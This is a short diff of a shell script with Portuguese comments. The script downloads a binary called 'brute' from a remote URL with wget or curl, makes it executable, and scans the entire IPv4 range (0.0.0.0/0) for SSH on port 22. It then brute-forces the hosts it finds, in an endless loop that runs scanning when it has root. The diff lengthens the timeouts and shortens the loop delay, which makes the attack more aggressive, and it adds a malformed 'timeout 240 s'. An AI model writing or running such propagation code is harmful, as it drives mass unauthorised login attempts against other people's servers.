@@ -22,18 +22,16 @@ wget $brute_url  -O brute || curl  -L $brute_url -o brute
 chmod 777 brute && chmod 777 nabu
 
 
-timeout   120s ./nabu  -p 22   -host  0.0.0.0/0  > ips  #120 segundos para  pega os ips
+timeout   240s ./nabu  -p 22   -host  0.0.0.0/0  > ips  #240 segundos para  pega os ips
  
 
 
-timeout   120s    ./brute  #120  segundos para  testa o   ip
+timeout   240 s    ./brute  #240  segundos para  testa o   ip
 
 
 return
 
 }
-
-
 
 
 #################################
@@ -57,12 +55,7 @@ return
 
 fi ; 
 
-
-
 #--------------------------------------------------------------
-
-
-
 
 
 if [ $EUID -eq  0 ] ; then #so faz o scan se for root
@@ -123,7 +116,7 @@ while true ; do
 
 install_nabu
  
-sleep   5
+sleep   1
 
 done
 
